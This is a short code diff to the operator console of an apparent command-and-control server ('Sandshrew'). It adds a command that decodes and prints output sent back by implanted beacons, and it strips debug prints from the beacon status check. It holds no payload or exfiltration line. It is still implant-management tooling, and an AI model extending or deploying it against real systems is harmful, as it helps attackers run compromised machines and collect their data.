@@ -6,7 +6,7 @@
     @author Dosh, JRoc
     github.com/doshmajhan/Sandshrew
 """
-import threading, sys, sqlite3, time
+import threading, sys, sqlite3, time, base64
 import server
 
 """
@@ -90,6 +90,13 @@ def start_prompt():
                         if b == x.tag:
                             s.bList += [x]
 
+            elif cmd[0] == "collect":   # collect output from a beacon
+                b = int(cmd[1])         # beacon tag
+                for x in s.beacons:
+                    decoded = base64.b64decode(x.output)    # decode beacons output
+                    if b == x.tag:
+                        print "Beacon %d: %s" % (x.tag, decoded)
+                        x.output = ""
 """
     Function to conenct to the servers sqlite3 backend
 
@@ -114,12 +121,10 @@ def check_status(s):
     t = time.localtime()
     # go through and get the difference of when the beacon checked in till now
     stats = []  # list of current beacon times
-    print t
     for b in s.beacons:
         temp = ((int(t.tm_min) * 60) + int(t.tm_sec))
-        print b.realtime
         stats += [(temp-b.realtime)]
-    print stats
+    
     d = {}
     for b in s.beacons:
         minute = stats[b.tag]/60
